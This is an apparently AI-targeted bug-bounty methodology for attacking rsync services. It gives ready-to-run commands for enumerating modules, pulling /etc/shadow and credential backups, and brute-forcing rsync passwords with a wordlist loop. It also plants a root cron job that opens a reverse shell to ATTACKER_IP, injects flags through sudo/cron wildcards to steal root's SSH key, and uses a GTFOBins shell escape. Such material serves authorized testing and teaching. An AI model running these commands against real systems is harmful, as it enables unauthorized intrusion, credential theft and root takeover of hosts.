---
technology: "rsync"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "evidence-grounded (7 attacking files, re-gate 2026-11-12: daemon-module/config/secrets/brute chain; anonymous module enum + read; no-auth read + cron.d write; module list -> EncFS crack; sudo-wildcard flag injection; cron-wildcard '-e' injection; client transfer) + upstream-verified (rsyncd.conf(5): list/auth users/secrets file/read only/uid semantics, 8-char password note; GTFOBins rsync -e escape; CVE-2014-9512 via NVD + Gentoo GLSA 201605-04 — just-sent symlink write, fixed 3.1.2) + supplement (2026-11-13) rewritten from HackTricks (src/network-services-pentesting/873-pentesting-rsync.md), CC BY-NC 4.0, accessed 2026-11-13 — CVE-2024-12084..12088/12747 and the 3.5.0/3.5.1 releases verified against rsync.samba.org/security.html and download.samba.org/pub/rsync/NEWS, rsync-ssl issue carries its verified CVE-2026-70454, daemon flags against rsyncd.conf(5). Companion overview: [[rsync|rsync]]."
---

# rsync bug bounty methodology

Target model: an rsync daemon on 873/tcp (custom ports happen — 8730 observed) or client-mode
rsync under sudo/cron. Daemon phases are anonymous unless a challenge appears. Authorization
assumed; module listing and reads are passive, writes are state-changing — flag before pushing.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Module enumeration (`rsync target::`) | any daemon | yes | Directory inventory — Info |
| Anonymous module read | module without `auth users` | yes | File exfil: configs, backups, keys — High |
| Config disclosure via exported /etc | any module mapping /etc | yes | Hidden modules + secrets path + ACL map — High |
| Secrets brute force (RSYNC_PASSWORD) | `auth users` module + known user | n/a (guessing) | Authenticated access — High |
| Authenticated/anonymous WRITE module | `read only = no` | varies | Arbitrary file write as module uid -> RCE — Critical |
| sudo/cron rsync with wildcard | client mode on won box | n/a (post) | Argument injection -> root — Critical |
| Daemon memory bugs (CVE-2014-9512) | rsync < 3.1.2 daemon/client pair | n/a | Write outside destination via symlink — High |

## Phase 0 — Confirm and enumerate modules

```bash
nmap -p 873 -sV 198.51.100.30          # "873/tcp open rsync?" is a common nmap guess — confirm:
nc -n 198.51.100.30 873               # banner: "@RSYNCD: <version>" on connect
rsync -av --list-only rsync://198.51.100.30/    # anonymous module listing (observed form)
rsync 198.51.100.30::                  # equivalent colon form — same listing
# nmap script route:
nmap -p 873 --script rsync-list-modules 198.51.100.30
```

Empty listing ≠ no modules: `list = false` hides names but they still resolve — guess the common
set (`etc`, `src`, `backups`, `home`, `www`, `share`, `data`). A module name that prompts for a
password reveals itself too (anonymous access attempt → challenge), so probing names also
enumerates auth-gated modules.

## Phase 1 — Anonymous read (the main observed foothold)

```bash
rsync -av --list-only rsync://198.51.100.30/backups   # browse before pulling
rsync -av rsync://198.51.100.30/backups/jenkins.tar.gz .   # observed: tarball -> service creds
rsync -a rsync://backup.corp.internal:873/src/etc/shadow ./loot    # observed: no-auth /src
```

Priority targets inside any readable module, in order: `/etc` (passwd, shadow if a privileged uid
serves it, rsyncd.conf itself), backup archives (service configs, Jenkins/GitLab/CMS creds —
an observed jenkins.tar.gz), app source (.env files, config.php), and anything that looks like a
secrets file. If a module serves `/etc` at any depth, pull `/etc/rsyncd.conf` first — Phase 2.

## Phase 2 — Config disclosure → hidden modules and secrets (observed chain)

```bash
rsync -a rsync://198.51.100.30/etc/rsyncd.conf .
# mine: every [module] name (list = false modules are hidden from Phase 0 but live here),
#       path mappings, uid (write runs as this user), read only = no (write lane),
#       auth users (who exists), secrets file = /etc/rsyncd.secrets (where passwords live)
```

Observed specifics worth copying: one readable config revealed a hidden per-user module
(`read only = no`, `uid = <user>`, `auth users = <user>`, `secrets file = /etc/rsyncd.secrets`); the
secrets file itself was access-denied, but its **13-byte size** was visible through the module
listing — `<user>:` + newline = 5 bytes, so an 8-character password. That sized a wordlist:

```bash
grep -E '^.{8}$' /usr/share/wordlists/rockyou.txt > wl8
for pass in $(cat wl8); do
  RSYNC_PASSWORD="$pass" rsync -q rsync://roy@198.51.100.30:8730/home_roy 2>/dev/null \
    && { echo "PASSWORD: $pass"; break; }
done
```

The man page's own 8-char client limitation note makes short-password secrets files the norm —
brute is usually cheap. (`--password-file` works identically for scripted loops.)

## Phase 3 — Write modules → arbitrary file write → RCE

When a module is `read only = no` (anonymous in one observed chain, authenticated after Phase 2), the push
lane is a file-write primitive as the module's uid:

```bash
# observed: root-owned /src served with write — plant a cron file:
echo '* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"' > clean
rsync -avp clean rsync://198.51.100.30:873/src/etc/cron.d/clean
```

Push targets ranked: `/etc/cron.d/*` (root cron), `~/.ssh/authorized_keys` for the uid's user,
service config/restart paths, `/etc/ld.so.preload`. Also read what write can *replace*: config
files whose parser runs privileged. Keep pushes minimal and clean them up.

## Phase 4 — Client-mode rsync on a won box (sudo/cron wildcard injection)

Two identical observed shapes, both argument injection through filenames the wildcard expands:

```bash
# (a) sudo NOPASSWD rsync with a wildcard in sudoers (observed):
#   sudo rsync -a --exclude=.hg '/home/dev/app-production/*' /opt/app/
# a file literally named  -p --chmod=Du=rwx,...  injects flags:
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/ \
  -p --chmod=Du=rwx,Dg=rx,Do=rx,Fu=rw,Fg=r,Fo=r /root/.ssh/id_rsa /opt/app/
cat /opt/app/id_rsa      # -> root SSH key
# (b) root cron running rsync with * (observed): create the payload filename
touch -- '/backups/-e bash shell.sh'      # cron expands: rsync ... -e bash shell.sh
```

Full command-line control (no fixed sudoers args) is simpler — GTFOBins' escape:
`rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x` (sudo/SUID variants noted there). One observed sudo chain shows the
caveat: when sudoers pins the args, `-e` remote-shell injection is rejected ("Unexpected remote
arg") but flag-injection filenames still work — enumerate which flags help (`--chmod`, `--perms`,
`--server` paths) rather than forcing the shell one.

## Phase 5 — Daemon memory bugs (rare, version-gated)

CVE-2014-9512 (fixed 3.1.2): a malicious **sender** could write outside the destination path via
a just-sent symlink — relevant when you control a client feeding a trusted puller, or box-to-box
sync where you own one side. The `@RSYNCD:` banner carries the daemon **protocol** version (31 spans releases 3.1.0+), not the package version — it cannot gate package CVEs; get the package version from the OS layer (package manager, leaks, foothold) before claiming a version-gated bug. Prefer the config lanes above — they pay far more often.

## SSH-mode confusion check (scope hygiene)

`rsync -e ssh host:path` runs no daemon — there is no 873 surface, no modules, no secrets file.
If that's all a box runs, the finding belongs to the ssh unit (key/auth abuse), not here. Only
`rsync://` URLs, `host::` forms, or a listening daemon are this surface.

## Reporting notes

- Anonymous read: High — enumerate exactly what was exfiltrable; configs/keys as impact.
- Config disclosure: High on its own when it yields hidden modules or secrets paths (observed).
- Write module: Critical with the pushed-file proof and the uid it lands as; include cleanup.
- sudo/cron wildcard: Critical privesc; quote the sudoers/cron line and the injected filename.
- Remediation framing: `auth users` + `secrets file` with long-enough passwords, `read only`
  default, `list = false` plus `hosts allow` narrowed, never map `/etc`, no wildcards in
  privileged rsync command lines, current rsync (>3.1.2) for the symlink class.

## Appendix — Tool map

- **nmap** (`-p 873 -sV`, rsync-list-modules) — Phase 0.
- **rsync** (client: `--list-only`, `rsync://`, `::`, `-a`, RSYNC_PASSWORD, --password-file) — Phases 0-3.
- **nc** — banner grab (`@RSYNCD:`) — Phase 0.
- **rockyou / wordlist tooling** — secrets brute sizing — Phase 2.
- **encfs2john + John** — EncFS-encrypted backup modules after exfil — Phase 1 follow-on.
- Tools vault companions by name: nmap, netcat, rsync, john, seclists.

CVE index: CVE-2014-9512 (rsync < 3.1.2 — write outside destination via just-sent symlink,
NVD + GLSA 201605-04, fixed 3.1.2). CVE-2014-8242 rides the same GLSA (multiple vulns, 3.1.2
boundary) — verify per-target before claiming either.

## Supplement (2026-11-13): the 2025/2026 security releases, banner semantics, and config surfaces beyond the basics

Rewritten from HackTricks (src/network-services-pentesting/873-pentesting-rsync.md), CC BY-NC 4.0, accessed 2026-11-13; every CVE number, release date, and version gate below verified against rsync.samba.org/security.html and the official NEWS file before writing.

### The modern CVE record (the page above stopped at 2014)

**rsync 3.4.0 (14 January 2025)** fixed six issues, all in the malicious-peer class, affecting 3.3.0 and earlier:

| CVE | Primitive (per the upstream advisory) |
|---|---|
| CVE-2024-12084 | heap buffer overflow in the daemon's checksum handling |
| CVE-2024-12085 | information leak from uninitialised stack memory during checksum comparison |
| CVE-2024-12086 | malicious **server** enumerates and reads arbitrary files from a pulling **client** |
| CVE-2024-12087 | malicious server writes outside the destination using `--inc-recursive` |
| CVE-2024-12088 | `--safe-links` failed to verify symlink targets containing other symlinks — path-traversal write |
| CVE-2024-12747 | symlink race in the sender when handling regular files |

**rsync 3.5.0 (13 August 2026)** fixed **33** further issues from a focused audit of path handling and the daemon protocol plus a daemon-protocol fuzzing pass (path confinement, daemon argument parsing, `rrsync`, access control, resource exhaustion, helper/hook handling — including unquoted peer-controlled substitutions in the `RSYNC_CONNECT_PROG` `%H` expansion and daemon exec-hook `%RSYNC_*%` expansions, CVE-2026-53792 among them); **3.5.1 (21 September 2026)** bumped the protocol number to 33 and repaired path-handling regressions from 3.5.0. For version gating this changes the practical rule: **a pull is not a passive operation** — the sender controls file lists, symlinks, checksums, and protocol messages the receiving client parses, so "we only pull from that server" is itself the vulnerable position on an unpatched client (12086/12087 are exactly this shape). Prefer the vendor-patched build and verify backports; a bare upstream version string is not the patch state.

### Banner semantics correction (affects Phase 5's gating advice)

`@RSYNCD: 31.0` is the **daemon protocol version**, not the package version — protocol 31 is spoken by every release from 3.1.0 onward, so the banner cannot distinguish 3.1.0 from 3.1.2 (the CVE-2014-9512 boundary), let alone a 3.2.x/3.3.x daemon against the 2025 CVEs. Where a file read or shell exists, get the real thing (`rsync --version` locally or over SSH) or check the distribution's package changelog; report memory-corruption findings only with the package version verified.

### Extended post-exploit config mining (Phase 2's key list, completed)

`rsyncd.conf` options that turn a config read into new attack surface, beyond the path/read-only/auth/secrets keys above:

- `pre-xfer exec` / `post-xfer exec` — per-transfer hooks running as the daemon; note any controllable substitution (user-supplied module/request values reaching a shell line).
- `proxy protocol` / `proxy protocol hosts` — trust of a PROXY-protocol header: if the "trusted proxy" range is reachable, source-IP ACLs are spoofable by prepending a header.
- `name converter` — an external program invoked to resolve names for logging; a controlled path is execution as the daemon.
- `refuse options`, `munge symlinks`, `insecure links`, `use chroot` — the confinement knobs; `munge symlinks` defaults to on where a plain chroot doesn't already confine, so `insecure links = yes` or a disabled munge is a deliberate (or legacy) relaxation.
- `RSYNC_CONNECT_PROG` (client side) and `rsync-ssl` — alternative transports with their own injection/authentication history (below).

Also grab the systemd/socket unit and process line: distro units select a non-default config file (`-config`/`--config`), so `/etc/rsyncd.conf` may not be the live policy.

### Two more client-side surfaces

- **`rsync-ssl` was not authentication**: before the 3.5.0 fixes (CVE-2026-70454), `rsync-ssl` in stunnel mode established an **unauthenticated** TLS connection — no CA verification, no hostname binding — so an active on-path attacker could impersonate the rsync server; the openssl backend had a matching hostname gap in 3.2.0–3.2.3. A deployment pointing at `rsync-ssl` is not necessarily talking to the real server.
- **Privileged scheduled rsync = TOCTOU fuel**: where root cron/systemd runs rsync with any of its source path, destination, filter files, log/batch files, or their parent directories writable by another user, symlink/race primitives can redirect what the privileged job reads, writes, or executes. Same class as Phase 4's wildcard injections, but the malicious object is a filesystem entry instead of a filename flag.

### Symlink confinement check on an authorized writable module

On an explicitly authorized test module (never production — it leaves attacker content), upload a symlink pointing above the module root and pull it back with link-following:

```bash
mkdir /tmp/rsync-link-test && cd /tmp/rsync-link-test
ln -s ../../../../etc/hostname escape
rsync -av escape rsync://198.51.100.30/EXAMPLE-MODULE/escape
rsync -avL rsync://198.51.100.30/EXAMPLE-MODULE/escape ./outside-proof   # -L follows the link
```

A safe setup returns the symlink as-is, rejects it, or stores a munged target; content from outside the module path is a confinement failure. Distinguish the response taxonomy while enumerating hidden modules: `@ERROR: Unknown module` (wrong name), an `AUTHREQD` challenge (module exists, creds needed), a host-ACL rejection, and an empty-but-successful listing all mean different things for guessing strategy. metasploit's `auxiliary/scanner/rsync/modules_list` is the framework-side module enumerator next to nmap's rsync-list-modules.
